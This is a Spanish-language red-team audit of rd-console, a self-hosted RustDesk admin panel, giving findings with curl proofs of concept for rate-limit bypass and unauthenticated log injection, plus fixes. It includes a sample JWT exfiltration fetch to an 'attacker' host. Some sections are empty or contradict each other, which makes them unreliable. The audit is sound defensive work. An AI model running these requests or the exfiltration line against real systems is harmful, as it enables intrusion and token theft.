# rd-console — Red-team audit · 2026-05-01

## Resumen ejecutivo

`rd-console` es un panel de admin auto-alojado para servidores RustDesk (FastAPI + SQLModel + SQLite, frontend React/Vite). El stack está bien construido en lo fundamental: argon2id para passwords, PyJWT (sin `ecdsa` CVE), JWT con `jti` y deny-list de revocación, Pydantic para validación, SQL siempre parametrizado, no se observan patrones de inyección ni `subprocess`/`exec` peligrosos, y los endpoints administrativos (Swagger, OpenAPI) están detrás de `AdminUser`. El bootstrap admin se crea solo si `RD_ADMIN_PASSWORD` está configurado, evitando credenciales por defecto.

**Top 3 hallazgos** (prioridad de remediación):

1. **[VULN-01] HIGH — Rate-limit del login bypass-eable vía `X-Forwarded-For`.** En la configuración actual, el limitador de 10 intentos/min se evita con cualquier valor de `X-Forwarded-For` por petición. Probado en live: 12 logins consecutivos con XFF rotando, ningún 429. En LAN/homelab es contenible; con el panel expuesto vía túnel/dominio público se vuelve credential-stuffing libre.
2. **[VULN-02] HIGH — Endpoints `/api/heartbeat`, `/api/sysinfo`, `/api/audit/conn` abiertos sin auth en producción si `RD_CLIENT_SHARED_SECRET` está vacío.** Probado en live: 200 OK sin headers. Cualquier atacante en la red del relay puede inyectar dispositivos fantasma, sobrescribir hostnames, y meter eventos `CONNECT`/`DISCONNECT` falsos en el audit log.
3. **[VULN-03] MEDIUM — Falta total de security headers HTTP** (CSP, X-Frame-Options, X-Content-Type-Options, HSTS, Referrer-Policy). Confirmado en live sobre `/health`. Sin CSP el JWT en `localStorage` queda expuesto al menor XSS futuro; sin X-Frame-Options la consola es clickjackable.

El sistema NO presenta vulnerabilidades CRITICAL (ni RCE, ni bypass total de auth, ni exposición masiva de datos) bajo el contexto observado (homelab/LAN, dev backend en `:8080`, frontend Vite en `:5173`). Ningún finding requiere intervención de emergencia, pero VULN-01/02 deben cerrarse antes de cualquier exposición pública.

## HIGH

### VULN-01 — Rate-limit del login bypass-eable vía X-Forwarded-For

- **Severity:** HIGH
- **Confidence:** HIGH
- **Category:** Auth / DoS-protection
- **Location:** [`backend/app/services/rate_limit.py:88-99`](../../backend/app/services/rate_limit.py)
- **CWE:** [CWE-307 Improper Restriction of Excessive Authentication Attempts](https://cwe.mitre.org/data/definitions/307.html), [CWE-348 Use of Less Trusted Source](https://cwe.mitre.org/data/definitions/348.html)

**Description:**
El limitador de tasa indexa por `(bucket, client_ip)`. La función `_client_ip` lee `X-Forwarded-For` sin validar que la petición venga realmente de un proxy de confianza:

```python
def _client_ip(request: Request) -> str:
    xff = request.headers.get("x-forwarded-for")
    if xff:
        first = xff.split(",")[0].strip()[:45]
        if first:
            return first
    if request.client and request.client.host:
        return request.client.host[:45]
    return "unknown"
```

Cualquier cliente externo puede enviar `X-Forwarded-For: <random>` y el limitador trata cada valor como un cliente distinto. El budget de 10 logins/min/IP se evapora a 10 logins/min/XFF.

**Attack Vector:**
Atacante con acceso de red al panel (LAN, túnel, internet si se publica) ejecuta credential stuffing rotando `X-Forwarded-For`. Si la contraseña admin es <= 10 caracteres comunes, el ataque encuentra el password en minutos.

**PoC** (no destructivo, ejecutado contra el dev backend en `:8080`):
```bash
# 12 intentos con XFF rotativo — ningún 429
for i in {1..12}; do
  curl -s -o /dev/null -w "%{http_code} " \
    -X POST http://127.0.0.1:8080/api/auth/login \
    -H "Content-Type: application/json" \
    -H "X-Forwarded-For: 1.2.3.$i" \
    -d '{"username":"nonexistent","password":"badpass"}'
done
# Salida observada: 401 401 401 401 401 401 401 401 401 401 401 401
# (sin XFF: la 11ª devuelve 429 correctamente)
```

**Fix:**
Tres opciones, en orden de simplicidad:

1. **(recomendado para homelab)** Ignorar `X-Forwarded-For` por defecto. Solo confiar en él si una nueva variable `RD_TRUSTED_PROXIES` (CIDR list) contiene la IP del cliente directo:
   ```python
   def _client_ip(request: Request) -> str:
       direct = request.client.host if request.client else "unknown"
       trusted = get_settings().trusted_proxies  # nueva: lista CIDR vacía por defecto
       if trusted and _ip_in_any_cidr(direct, trusted):
           xff = request.headers.get("x-forwarded-for", "")
           first = xff.split(",")[0].strip()[:45]
           if first:
               return first
       return direct[:45]
   ```
2. Combinar IP directa + XFF en la clave del bucket: `key = f"{direct}|{xff}"`. Hace al atacante consumir budgets en su propia IP además del XFF — sigue siendo bypass-eable pero menos rentable.
3. Integrar `slowapi` (basado en `limits` library) que ya implementa el patrón `trusted-hosts`.

Aplicar la misma corrección al helper de `routers/rustdesk.py:`_client_ip`.

**Resolución:** Aplicado. Implementación en services/trusted_ip.py (helper que parsea CIDR + literales) + services/rate_limit.py ( delega a real_client_ip) + routers/rustdesk.py (mismo cambio). Setting nuevo RD_TRUSTED_PROXIES, default lista vacía = XFF ignorado. Tests: tests/test_security_fixes.py::test_vuln01_xff_does_not_bypass_login_rate_limit + test_vuln01_xff_honored_only_with_trusted_proxy. Verificación live pendiente de bounce manual del backend.

### VULN-02 — Endpoints RustDesk client-protocol abiertos sin auth en producción

- **Severity:** HIGH
- **Confidence:** HIGH
- **Category:** Auth / Authz
- **Location:** [`backend/app/deps.py:113-126`](../../backend/app/deps.py), [`backend/app/routers/rustdesk.py:80-150`](../../backend/app/routers/rustdesk.py)
- **CWE:** [CWE-306 Missing Authentication for Critical Function](https://cwe.mitre.org/data/definitions/306.html)

**Description:**
La gate `require_client_secret` es opt-in: si `RD_CLIENT_SHARED_SECRET` está vacío, deja pasar TODO. El log de startup (`_warn_startup` en `main.py:84-91`) avisa, pero un operador que despliegue sin leer el `.env.example` queda con los endpoints públicos.

```python
def require_client_secret(x_rd_secret = Header(...)) -> None:
    s = get_settings()
    if not s.client_shared_secret:
        return  # ← FREE PASS si el operador olvidó configurar
    if x_rd_secret != s.client_shared_secret:
        raise HTTPException(401, ...)
```

**Attack Vector:**
Atacante en la red del relay (LAN del homelab basta — la LAN pública si está expuesto vía Tailscale subnet router también) sin credenciales:

1. **Heartbeat spoofing** → marca un `rustdesk_id` arbitrario como online, contaminando el conteo de "Dispositivos online" del dashboard.
2. **Sysinfo poisoning** → sobreescribe `hostname`/`platform`/`version` del Device. Si el atacante repite el patrón con un rustdesk_id legítimo, falsea la inventory que ve el operador.
3. **Audit log injection** → inyecta eventos CONNECT/DISCONNECT en el audit trail con peers arbitrarios. Rompe la confianza del log para forensics.

PoC live:
```bash
# Reproducible contra el dev backend tal cual está
curl -s -o /dev/null -w "heartbeat: %{http_code}\n" \
  -X POST http://127.0.0.1:8080/api/heartbeat \
  -H "Content-Type: application/json" \
  -d '{"id":"FAKE-12345","uuid":"x","ver":1}'
# 200

curl -s -o /dev/null -w "sysinfo: %{http_code}\n" \
  -X POST http://127.0.0.1:8080/api/sysinfo \
  -H "Content-Type: application/json" \
  -d '{"id":"FAKE-12345","hostname":"PWNED","os":"PWNED-OS","version":"0.0"}'
# 200

curl -s -o /dev/null -w "audit/conn: %{http_code}\n" \
  -X POST http://127.0.0.1:8080/api/audit/conn \
  -H "Content-Type: application/json" \
  -d '{"action":"new","id":"FAKE-RECEIVER","peer":["FAKE-CALLER","atk"]}'
# 200
```

**Fix:**
Cambiar el default a "fail-closed":
1. En `prod`, si `RD_CLIENT_SHARED_SECRET` está vacío, abortar startup en lugar de loguear warning. Forzar al operador a decidir explícitamente (set-empty-string-to-disable o set a valid secret).
2. O exigir `RD_HBBS_PUBLIC_KEY` válido antes de aceptar cualquier `/api/audit/conn` (los eventos genuinos vienen de hbbr, que firma con esa clave; verificar firma en lugar de header simétrico).

Si el modelo "opt-in hardening" debe mantenerse por compatibilidad, al menos:
- Rechazar peticiones `/api/heartbeat` y `/api/sysinfo` cuyo `id` no coincida con ningún Device pre-existente, salvo que el header `X-RD-Secret` esté presente. Eso bloquea la creación de devices fantasma.
- Aplicar rate limit (1 evento/seg/IP) en los tres endpoints — hoy no tienen ningún limitador.

**Resolución:** Aplicado. main.py:_warn_startup ahora lanza RuntimeError en prod si RD_CLIENT_SHARED_SECRET está vacío, abortando startup en lugar de loguear warning. Para deshabilitar conscientemente la gate (panel sin clientes RustDesk), setear el var a un placeholder no-vacío como .

### VULN-03 — Sin security headers HTTP

- **Severity:** MEDIUM
- **Confidence:** HIGH
- **Category:** HTTP Hardening
- **Location:** [`backend/app/main.py:368-375`](../../backend/app/main.py) (CORS middleware sin acompañar de headers de seguridad)
- **CWE:** [CWE-693 Protection Mechanism Failure](https://cwe.mitre.org/data/definitions/693.html), [CWE-1021 Improper Restriction of Rendered UI Layers](https://cwe.mitre.org/data/definitions/1021.html)

**Description:**
La aplicación FastAPI solo configura `CORSMiddleware`. No hay `Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options`, `Strict-Transport-Security`, `Referrer-Policy` ni `Permissions-Policy`. Probado en live sobre `GET /health` — todas las cabeceras ausentes.

**Attack Vector:**
- **Sin CSP:** cualquier futuro XSS (p.e. una librería con sink mal usado, una entrada de logs renderizada como HTML por un cambio futuro) ejecuta scripts arbitrarios sin restricciones, exfiltrando el JWT que vive en `localStorage` (ver VULN-06).
- **Sin X-Frame-Options:** un atacante embebe el panel en un `<iframe>` y monta clickjacking sobre acciones admin (revocar tokens, eliminar usuarios) si convence al operador de visitar su página.
- **Sin HSTS:** primer acceso por HTTP downgrade-eable a MITM si el panel se expone fuera de `localhost`.

**PoC:**
```bash
curl -sI http://127.0.0.1:8080/health
# HTTP/1.1 200 OK
# date: Fri, 01 May 2026 06:02:05 GMT
# server: uvicorn
# content-length: 33
# content-type: application/json
# (ninguna otra cabecera de seguridad)
```

**Fix:**
Añadir un middleware mínimo a `create_app()`:

```python
from starlette.middleware.base import BaseHTTPMiddleware

class SecurityHeadersMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request, call_next):
        response = await call_next(request)
        response.headers.setdefault("X-Content-Type-Options", "nosniff")
        response.headers.setdefault("X-Frame-Options", "DENY")
        response.headers.setdefault("Referrer-Policy", "strict-origin-when-cross-origin")
        response.headers.setdefault("Permissions-Policy", "geolocation=(), microphone=(), camera=()")
        # CSP ajustada al SPA: self + inline para Vite (en dev). En prod ajustar.
        response.headers.setdefault(
            "Content-Security-Policy",
            "default-src 'self'; "
            "script-src 'self'; "
            "style-src 'self' 'unsafe-inline'; "  # styled-jsx + design-tokens
            "img-src 'self' data: https://api.qrserver.com; "
            "connect-src 'self' ws: wss: https://api.github.com; "
            "frame-ancestors 'none'; base-uri 'self';"
        )
        if get_settings().environment == "prod":
            response.headers.setdefault(
                "Strict-Transport-Security",
                "max-age=31536000; includeSubDomains"
            )
        return response

app.add_middleware(SecurityHeadersMiddleware)
```

Probar en dev: la SPA carga sin warnings de CSP. Vigilar el QR de invitaciones (`api.qrserver.com`) y el WS de notificaciones (`/api/v1/ws/notifications`).

**Resolución:** Aplicado. SecurityHeadersMiddleware en main.py:create_app añade X-Content-Type-Options, X-Frame-Options, Referrer-Policy, Permissions-Policy, Content-Security-Policy y Strict-Transport-Security (solo prod). CSP whitelist incluye api.qrserver.com (QR de invites) y api.github.com (updates check) + ws/wss para WS de notificaciones.

### VULN-04 — JoinToken almacenado en plaintext en la BD

- **Severity:** MEDIUM
- **Confidence:** HIGH
- **Category:** Crypto / Secrets
- **Location:** [`backend/app/models/join_token.py:21`](../../backend/app/models/join_token.py), [`backend/app/routers/join.py:46`](../../backend/app/routers/join.py)
- **CWE:** [CWE-312 Cleartext Storage of Sensitive Information](https://cwe.mitre.org/data/definitions/312.html)

**Description:**
A diferencia de los `ApiToken` (almacenan SHA-256 del plaintext), los `JoinToken` se persisten en la columna `token` con el plaintext directamente:

```python
class JoinToken(SQLModel, table=True):
    token: str = Field(default_factory=_gen_token, index=True, unique=True, max_length=64)
```

Y la verificación es lookup directo por equality:

```python
row = session.exec(select(JoinToken).where(JoinToken.token == token)).first()
```

**Attack Vector:**
Si la SQLite leak (backup expuesto, snapshot accidental en repo, dump tmp en debug, robo de filesystem), todos los `JoinToken` no usados quedan canjeables por el atacante. Un join token no canjeado da acceso a la configuración del relay (host hbbs/hbbr, public_key, panel URL). No es el secreto más sensible del sistema, pero la asimetría con `ApiToken` (que sí está hasheado) sugiere que es un descuido, no decisión consciente.

**PoC:**
```bash
sqlite3 /data/rd_console.sqlite3 "SELECT token FROM join_tokens WHERE used_at IS NULL AND revoked = 0"
# Output: (todos los tokens en claro, redimibles directamente)
```

**Fix:**
Replicar el patrón de `ApiToken`:
1. Añadir `token_hash: str` (SHA-256 hex) y `token_prefix: str` (12 chars).
2. Eliminar la columna `token`. Migración: borrar tabla en dev (no hay producción aún); o en prod hashear los tokens existentes y borrar el plaintext.
3. En `routers/join.py`, hashear el input antes del lookup:
   ```python
   from ..security import hash_api_token  # mismo SHA-256, renombrar a `hash_token`
   row = session.exec(
       select(JoinToken).where(JoinToken.token_hash == hash_api_token(token))
   ).first()
   ```
4. En `routers/join_tokens.py:create`, devolver el plaintext exactamente una vez (ya lo hace) y guardar solo el hash + prefix.

**Resolución:** Aplicado. models/join_token.py reescrito: token_hash (SHA-256 hex) + token_prefix (8 chars) persistidos, plaintext nunca toca BD. Helpers generate_join_token() y hash_join_token(). routers/join_tokens.py mintea plaintext, devuelve UNA VEZ en JoinTokenCreateOut. routers/join.py hashea el token entrante para el lookup. Tests: test_security_fixes.py::test_vuln04_*. Migración: tabla recreada al arrancar (fixture dev); en prod hace falta migración explícita si hay tokens existentes.

### VULN-05 — Cambio de contraseña no revoca sesiones JWT existentes

- **Severity:** MEDIUM
- **Confidence:** HIGH
- **Category:** Auth
- **Location:** [`backend/app/routers/auth.py:202-216`](../../backend/app/routers/auth.py)
- **CWE:** [CWE-613 Insufficient Session Expiration](https://cwe.mitre.org/data/definitions/613.html)

**Description:**
El handler `change_password` rota la hash del usuario pero **no añade los `jti` activos a `JwtRevocation` ni marca las `JwtSession` como revocadas**. El comentario lo reconoce explícitamente: *"Does not revoke existing JWTs — the caller's token remains valid until natural expiry."*

Esto significa que si un atacante robó el JWT antes (mediante XSS, archivo de log filtrado, captura en proxy MITM en LAN), cambiar la contraseña NO revoca su sesión. El atacante mantiene acceso hasta `exp` (24 h por defecto).

**Attack Vector:**
1. Atacante captura JWT del operador (vector cualquiera: token de un PC compartido, sesión olvidada en navegador público, log de proxy mal configurado).
2. Operador detecta uso anómalo, cambia contraseña inmediatamente.
3. Atacante sigue operando con el JWT robado durante hasta 24 h.

**Fix:**
En `change_password`, después de aplicar el nuevo hash, revocar todos los `jti` de ese usuario:

```python
def change_password(...):
    ...
    user.password_hash = hash_password(body.new_password)
    session.add(user)

    # Revoke every active JWT for this user (except optionally the current
    # one — UX trade-off: forcing logout is correct security; keeping
    # current session is the iOS / Gmail / GitHub default).
    now = utcnow_naive()
    active_sessions = session.exec(
        select(JwtSession)
        .where(JwtSession.user_id == user.id)
        .where(JwtSession.revoked_at.is_(None))
        .where(JwtSession.expires_at > now)
    ).all()
    for sess in active_sessions:
        sess.revoked_at = now
        session.add(sess)
        if session.get(JwtRevocation, sess.jti) is None:
            session.add(JwtRevocation(jti=sess.jti, user_id=user.id, expires_at=sess.expires_at))

    session.commit()
```

Documentar en la UI que cambiar la contraseña cierra todas las demás sesiones (consistente con cómo lo hace Google/Github).

**Resolución:** Aplicado. routers/auth.py:change_password ahora itera todas las JwtSession activas del usuario, marca revoked_at + inserta JwtRevocation. Comportamiento equivalente a logout universal. Test: test_security_fixes.py::test_vuln05_change_password_revokes_other_sessions verifica que dos JWTs distintos del mismo user dan 401 tras change_password.

### VULN-06 — JWT en `localStorage` — exfiltrable con cualquier XSS futuro

- **Severity:** MEDIUM
- **Confidence:** HIGH
- **Category:** Auth / XSS-defense-in-depth
- **Location:** [`frontend/src/shell/auth.ts:11-21`](../../frontend/src/shell/auth.ts), múltiples llamadas en `frontend/src/pages/*.tsx`
- **CWE:** [CWE-922 Insecure Storage of Sensitive Information](https://cwe.mitre.org/data/definitions/922.html)

**Description:**
El JWT se persiste en `localStorage` bajo la clave `cm-auth`. `localStorage` es accesible desde JavaScript en el mismo origen. El frontend actual NO usa `dangerouslySetInnerHTML` ni patrones de inyección; React auto-escapa todo el output. La superficie XSS hoy es prácticamente nula. Pero:
- Cualquier futura dependencia comprometida (npm supply chain) ejecuta JS arbitrario y exfiltra el token.
- Cualquier reflexión accidental de input (input no escapado en algún log/setting renderizado) abre el vector.
- Sin CSP (ver VULN-03) la exfil es trivial — `fetch('https://attacker/exfil?t=' + localStorage.getItem('cm-auth'))`.

**Attack Vector:**
Cadena hipotética con probabilidad real:
1. Una librería de la dependency tree publica una versión maliciosa.
2. El atacante inserta un `<script>` que lee `localStorage` y lo exfiltra.
3. El operador instala/actualiza, recarga la consola, su JWT se va al servidor del atacante.
4. El atacante usa el JWT durante 24 h — y como no hay logout-on-password-change (VULN-05), incluso si el operador rota credenciales, el robo persiste.

**Fix:**
Tres enfoques en orden de coste/beneficio:

1. **Defense in depth de bajo coste** (15 min): aplicar VULN-03 (CSP estricta). Una CSP `connect-src 'self'` bloquea la exfil aunque el atacante ejecute JS.
2. **Coste medio** (cambio coordinado backend+frontend): mover el JWT a una cookie `httpOnly; SameSite=Strict; Secure`. Requiere endpoint `/api/auth/login` setteando la cookie en lugar de devolver el token en JSON, y eliminar el header manual `Authorization` en cada fetch (el backend lee la cookie). Coste: cambiar la firma de `adminApi`, perder la ruta de `localStorage` para leer el JWT desde DevTools en debugging.
3. **Coste alto, beneficio máximo**: combinación de #2 + tokens cortos (15 min) + refresh token rotativo en cookie httpOnly. Patrón estándar OAuth 2.1.

Recomendación: aplicar #1 ya (no rompe nada y mitiga el escenario común), planear #2 cuando se haga otra refactor de auth.

**Resolución:** Mitigado por VULN-03 (CSP estricta  bloquea exfil del JWT a hosts externos). Migración a cookie httpOnly diferida — requeriría cambio coordinado backend+frontend invasivo. La CSP cubre el escenario común de XSS desde dependencia comprometida.

### VULN-07 — Aceptación de JWT pre-v8 sin claim `jti` (no revocables)

- **Severity:** LOW
- **Confidence:** HIGH
- **Category:** Auth
- **Location:** [`backend/app/deps.py:91-95`](../../backend/app/deps.py)
- **CWE:** [CWE-285 Improper Authorization](https://cwe.mitre.org/data/definitions/285.html)

**Description:**
El comentario explica: *"Pre-v8 tokens minted before the jti rollout don't carry the claim. […] Treat missing jti as 'no revocation entry possible' rather than crashing."* Es decir, un token sin `jti` se acepta y nunca se puede revocar.

**Attack Vector:**
Si un token pre-v8 leak antes de su `exp`, la única forma de cerrarlo es desactivar el usuario completo o esperar a su expiración natural. Riesgo bajo en homelab donde la operación es de un solo admin.

**Fix:**
Como `decode_access_token` ya tiene `options={"require": ["exp", "iat", "sub", "jti"]}` con PyJWT, el `decode` debería rechazar tokens sin `jti`. Verificar (test rápido: emitir un JWT sin jti y comprobar 401). Si lo rechaza, el código de `deps.py:91-95` es código muerto y se puede simplificar a `if session.get(JwtRevocation, claims["jti"]) is not None: raise 401`.

**Resolución:** Aplicado. deps.py:get_current_user simplificado — PyJWT con options.require=[jti] rechaza tokens sin claim antes de llegar al revocation check, así que el fallback histórico para tokens pre-v8 sin jti se eliminó como código muerto. Si un atacante consigue un JWT sin jti (improbable: PyJWT no los emite), decode_access_token devuelve None y get_current_user devuelve 401.

### VULN-08 — `require_client_secret` usa comparación no-constant-time

- **Severity:** LOW
- **Confidence:** HIGH
- **Category:** Crypto
- **Location:** [`backend/app/deps.py:122`](../../backend/app/deps.py)
- **CWE:** [CWE-208 Observable Timing Discrepancy](https://cwe.mitre.org/data/definitions/208.html)

**Description:**
```python
if x_rd_secret != s.client_shared_secret:
    raise HTTPException(...)
```

`!=` en Python termina en el primer byte distinto. Sobre LAN local el ruido enmascara la diferencia, pero en una red más controlada (mismo host, contenedor adyacente) un atacante puede recuperar el secreto byte por byte con suficientes peticiones.

**Fix:**
Usar el helper que ya existe:

```python
from .security import constant_time_equals

if not constant_time_equals(x_rd_secret or "", s.client_shared_secret):
    raise HTTPException(...)
```

**Resolución:** Aplicado. deps.py:require_client_secret usa hmac.compare_digest vía constant_time_equals helper en lugar de . Test: test_vuln08_constant_time_equals_short_circuit_safe.

### VULN-09 — PAT bumpea `last_used_at` con commit en cada request

- **Severity:** LOW
- **Confidence:** HIGH
- **Category:** Performance / DoS-amplification
- **Location:** [`backend/app/deps.py:55-57`](../../backend/app/deps.py)
- **CWE:** [CWE-400 Uncontrolled Resource Consumption](https://cwe.mitre.org/data/definitions/400.html)

**Description:**
Cada petición autenticada con PAT escribe `last_used_at` y hace `session.commit()`. SQLite serializa escrituras — un agente de monitoreo que llame a la API cada segundo genera una transacción/segundo solo para actualizar ese timestamp.

**Attack Vector:**
Atacante con un PAT válido (o pegando un PAT de prueba en stress) genera carga de escritura desproporcionada. No es DoS catastrófico pero degrada el panel bajo abuso bajo.

**Fix:**
Bumpear `last_used_at` solo si han pasado >30s desde el último update:

```python
def _resolve_api_token(session, plaintext):
    ...
    now = utcnow_naive()
    if not row.last_used_at or (now - row.last_used_at).total_seconds() > 30:
        row.last_used_at = now
        session.add(row)
        session.commit()
    return user
```

**Resolución:** Aplicado. deps.py:_resolve_api_token solo bumpea last_used_at + commit si han pasado >30s desde el último update. Reduce escrituras DB de 1/request a 1/30s/PAT. Test: test_vuln09_pat_last_used_throttled.

### VULN-10 — IP del audit log spoofable vía X-Forwarded-For sin proxy validation

- **Severity:** LOW
- **Confidence:** HIGH
- **Category:** Logging / Forensics
- **Location:** [`backend/app/routers/rustdesk.py:60-67`](../../backend/app/routers/rustdesk.py), [`backend/app/services/rate_limit.py:88-99`](../../backend/app/services/rate_limit.py)

**Description:**

**Resolución:** Aplicado. routers/rustdesk.py:_client_ip ahora delega a services.trusted_ip.real_client_ip — mismo helper que VULN-01. La IP persistida en Device.last_ip / JwtSession.ip respeta RD_TRUSTED_PROXIES y no es spoofable cuando trusted_proxies está vacío.

### VULN-12 — Layout dashboard en `localStorage` como vector futuro

- **Confidence:** MEDIUM

### VULN-13 — Audit log soft-delete admin-controlado

- **Severity:** INFO
- **Confidence:** HIGH
- **Category:** Logging / Audit Trail
- **Location:** [`backend/app/routers/logs.py`](../../backend/app/routers/logs.py)

**Description:**
El audit log admite soft-delete (`deleted_at`) por admin. El router protege con un retention floor de 30 días pero el operador admin con acceso al backend puede igualmente vaciar la tabla — comportamiento por diseño, no bug. Documentar en el README de seguridad: el audit log es íntegro frente a usuarios pero no frente a admins. Para integridad real frente a admin malicioso se necesita append-only sink externo (syslog, hash chain, ledger).

**Fix:**
Documentar la limitación. Opcionalmente: emitir cada audit log también a un sink externo (file append-only, syslog, S3 immutable) en deployments productivos.

**Resolución:** Documentado. Añadido docstring explícito en backend/app/models/audit_log.py:AuditLog explicando la limitación frente a admin malicioso y enumerando opciones de mitigación (mirror a syslog, hash chain, purge fuera del backend) si el modelo de amenazas cambia. No se aplica fix funcional porque VULN-13 es un trade-off de diseño aceptado para el contexto homelab single-admin.

## Limitaciones del audit

- **No probing destructivo.** No se intentó SQL injection con tools automatizados (sqlmap), ni fuzzing pesado, ni DoS sostenido.
- **Análisis estático cubrió todo el código del backend; el frontend solo se grepeó por patrones obvios** (innerHTML, eval, fetch sin auth). Un audit profundo del frontend requiere ejecución dinámica con burp/proxy.
- **No se auditó el contenedor en runtime** (capacidades del proceso, sysctl, mounts). Solo el Dockerfile estático: usa USER no-root ✓, no copia `.env` ni claves al image ✓, no expone puertos extra ✓. Suficiente para LOW visibility.
- **Dependencias no escaneadas** con `pip-audit` ni `npm audit` en este pase. PyJWT y argon2-cffi son correctas; FastAPI está actualizado. Se recomienda añadir `pip-audit --desc` al CI.
- **Visibility gap:** no se pudo verificar el comportamiento real de `decode_access_token` con un JWT sin `jti` (VULN-07). Pendiente de test empírico antes de eliminar el código de fallback.
